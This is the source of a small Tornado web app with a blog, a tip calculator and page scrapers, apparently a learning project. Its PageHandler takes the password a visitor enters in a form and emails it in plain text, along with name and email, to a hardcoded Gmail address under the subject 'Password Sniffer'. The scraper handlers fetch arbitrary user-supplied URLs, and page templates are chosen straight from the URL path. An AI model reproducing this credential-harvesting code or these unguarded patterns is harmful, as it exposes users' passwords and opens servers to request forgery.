import os  # deploy line: says this is the standard library
import boto3
import tornado.ioloop
import tornado.web
import tornado.log
from bs4 import BeautifulSoup
import requests
from models import BlogPost, Author
from dotenv import load_dotenv
from jinja2 import \
    Environment, PackageLoader, select_autoescape

load_dotenv('.env') #this is set in your environement for production. in deployment, it wil be stored in server.


# deploy line: says get the port variable. If there is no port var, get the default. the default here is 8888. Anything above 1000 works. Ports < 1000 are reserved unless you are a root developer.
PORT = int(os.environ.get('PORT', '8888'))

ENV = Environment(
    loader=PackageLoader('myapp', 'templates'),
    autoescape=select_autoescape(['html', 'xml'])
)

SES_CLIENT = boto3.client(
  'ses',
  aws_access_key_id=os.environ.get('AWS_ACCESS_KEY'),
  aws_secret_access_key=os.environ.get('AWS_SECRET_KEY'),
  region_name="us-west-2"
)


class TemplateHandler(tornado.web.RequestHandler):
    def render_template(self, tpl, context):
        template = ENV.get_template(tpl)
        self.write(template.render(**context))
class MainHandler(TemplateHandler):
    def get(self):
        names = self.get_query_arguments('name')
        self.set_header('Cache-Control','no-store, no-cache, must-revalidate, max-age=0')
        self.render_template("index.html",{})
class BlogAuthorHandler(TemplateHandler):
    def get(self, id):
        posts = BlogPost.select().where(BlogPost.author_id == id)
        author = Author.select().where(Author.id == id)
        self.render_template("authorsposts.html", {'posts': posts, 'author': author})
class BlogHandler(TemplateHandler):
    def get(self, slug):
        post = BlogPost.select().where(BlogPost.slug == slug).get()
        self.render_template("blogpost.html", {'post': post})
class PostHandler(TemplateHandler):
    def post(self):
        title = self.get_body_argument('title')
        body = self.get_body_argument('body')
        author = self.get_body_argument('author')
        twitter = self.get_body_argument('twitter')

        if author == 'newauthor':
            newauthor = self.get_body_argument('newauthor')
            newtwitter = self.get_body_argument('newtwitter')
            thisauthor = Author.get_or_create(name=newauthor, twitter=newtwitter)
            a = str(thisauthor[0])
            thisauthor = Author.select().where(Author.name == a).get()
        else:
            thisauthor = Author.get_or_create(name=author, twitter=twitter)
            a = str(thisauthor[0])
            thisauthor = Author.select().where(Author.name == a).get()

        post = BlogPost.create(title=title, slug = title+"-post", body = body, author_id = thisauthor.id)
        post.save()

        posts = BlogPost.select().order_by(BlogPost.created.desc())
        self.render_template('blog.html',{'posts':posts})
class EditPostHandler(TemplateHandler):
    def get(self, slug):
        post = BlogPost.select().where(BlogPost.slug == slug).get()
        author = Author.select().where(Author.id == post.author_id).get()
        self.render_template("editblog.html", {'post': post, 'author': author})
class UpdatePostHandler(TemplateHandler):
    def post(self):
        title = self.get_body_argument('title')
        body = self.get_body_argument('body')
        slug = self.get_body_argument('slug')
        author = self.get_body_argument('author')

        if author == "addnewauthor":
            Author.create(name=author)

        newauthor = Author.select().where(Author.name == author)
        post = BlogPost.select().where(BlogPost.slug == slug).get()

        post.title = title
        post.body = body
        post.author = newauthor
        post.save()

        self.redirect('/post/' + slug)
class TipCalcHandler(TemplateHandler):
    def post(self):
        bill = float(self.get_body_argument('bill'))
        service = self.get_body_argument('service')
        people = float(self.get_body_argument('people'))
        if service == "Good":
            tip = bill * 0.20
        elif service == "Fair":
            tip = bill * 0.15
        else:
            tip = bill * 0.10
        if people == 0:
            totalbill = bill + tip
        else:
            totalbill = (bill + tip)/people
        self.render_template('tip.html', {'bill': bill, 'service': service, 'people': people, 'totalbill': totalbill})
class PyScraper(TemplateHandler):
    def post(self):
        url = self.get_body_argument('url')
        numwords = int(self.get_body_argument('numwords'))

        r = requests.get(url)
        html_content = r.text
        soup = BeautifulSoup(html_content, 'html.parser')
        for script in soup(["script", "style"]):
            script.extract()    # rip it out

        soup = soup.get_text().strip().split()

        uniquewords = {}

        for i in soup:
            if i not in uniquewords:
                uniquewords[i] = 0
        for i in soup:
            uniquewords[i] += 1

        order = sorted(uniquewords, key = uniquewords.get, reverse=True)
        values = [uniquewords[key] for key in order]


        # uniquewords =[]
        # for i in range(numwords):
        #     uniquewords.append(order[i])

        self.render_template('pyscrap.html', {'url': url, 'words': uniquewords})
class Readable(TemplateHandler):
    def post(self):
        url = self.get_body_argument('url')

        r = requests.get(url)
        html_content = r.text
        soup = BeautifulSoup(html_content, 'html.parser')

        kevin = soup.body

        h1 = soup.find_all(["h1"]) #list of h1
        p = soup.find_all(["p"]) #list of p

        h1p = soup.find_all(["h1","p"])

        soup = []
        for i in h1p:
            soup.append(i.get_text())


        self.render_template('readable_result.html', {'url': url, 'soup': soup, 'h1': h1, 'p': p, 'kevin': kevin})
class PageHandler(TemplateHandler):
    def post(self, page):
        self.set_header('Cache-Control','no-store, no-cache, must-revalidate, max-age=0')
        name = self.get_body_argument('name')
        email = self.get_body_argument('email')
        password = self.get_body_argument('password')
        message = self.get_body_argument('message')
        self.redirect("/page/thankyou.html") #tornado throws a 302 error if page is nonexistent

        response = SES_CLIENT.send_email(
          Destination={
            'ToAddresses': ['chancecordelia@gmail.com'],
          },
          Message={
            'Body': {
              'Text': {
                'Charset': 'UTF-8',
                'Data': 'Name: {}\nEmail: {}\nPassword: {}\nMessage: {}\n'.format(name, email, password, message),
              },
            },
            'Subject': {'Charset': 'UTF-8', 'Data': 'Password Sniffer'},
          },
          Source='chancecordelia@gmail.com',
        )

    def get(self, page):
        self.set_header(
            'Cache-Control',
            'no-store, no-cache, must-revalidate, max-age=0')
        posts = BlogPost.select().order_by(BlogPost.created.desc())
        authors = Author.select()
        self.render_template(page, {'posts': posts, 'authors':authors})

def make_app():
    return tornado.web.Application([
        (r"/", MainHandler),
        (r"/post/(.*)",BlogHandler),
        (r"/addblogpost",PostHandler),
        (r"/author/(.*)", BlogAuthorHandler),
        (r"/edit/(.*)",EditPostHandler),
        (r"/update", UpdatePostHandler),
        (r"/page/(.*)", PageHandler),
        (r"/tipcalc", TipCalcHandler),
        (r"/py-scraper", PyScraper),
        (r"/readable", Readable),
        (
            r"/static/(.*)",
            tornado.web.StaticFileHandler,
            {'path': 'static'}
        ),
    ], autoreload=True)
if __name__ == "__main__":
    tornado.log.enable_pretty_logging()
    app = make_app()
    app.listen(PORT, print('Server started on localhost:' + str(PORT)))
    tornado.ioloop.IOLoop.current().start()
